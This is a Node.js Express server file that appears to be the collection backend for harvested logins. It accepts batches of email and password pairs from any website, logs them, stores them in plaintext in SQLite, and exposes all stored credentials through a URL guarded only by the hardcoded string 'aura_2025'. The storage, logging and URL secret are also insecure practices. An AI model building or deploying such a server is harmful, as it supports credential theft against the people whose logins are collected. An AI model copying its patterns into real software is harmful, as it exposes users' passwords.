const express = require('express')
const sqlite3 = require('sqlite3').verbose()
const cors = require('cors')
const path = require('path');


const db = new sqlite3.Database('users.db', (err) => {
  if (err) {
    console.error('Could not connect to database', err)
    } else {
    console.log('Connected to database')
    }
})

const app = express()
app.use(express.json())
app.use(cors())

app.use(express.static(path.join(__dirname, 'public')));


app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public/index.html'));
});




app.post('/add', express.json(), (req, res) => {

    console.log('Received data:', req.body)
    let data = req.body.credentials
    const stmt = db.prepare('INSERT INTO users (email, password) VALUES (?, ?)')  

    data.forEach(credential => {
        const { email, password } = credential
        stmt.run(email, password, function(err) {
            if (err) {
                console.error('Database error:', err)
            } else {
                console.log('Inserted credential with ID:', this.lastID)
            }       
        })
    })
    res.json({ message: 'Credentials added successfully' })
    stmt.finalize()

})  




app.get('/users/:pass', (req, res) => {
    const password = req.params.pass

    if (password === "aura_2025"){
        db.all('SELECT * FROM users', [], (err, rows) => {
            if (err) {
                console.error('Database error:', err)
                res.status(500).json({ error: 'Database error' })
            }  
            else {
                res.json(rows)
            }
        })
    } else {
        res.status(403).json({ error: 'Unauthorized access' })  
    }       
})



app.listen(3000, () => {
    console.log('Server is running on http://localhost:3000')
})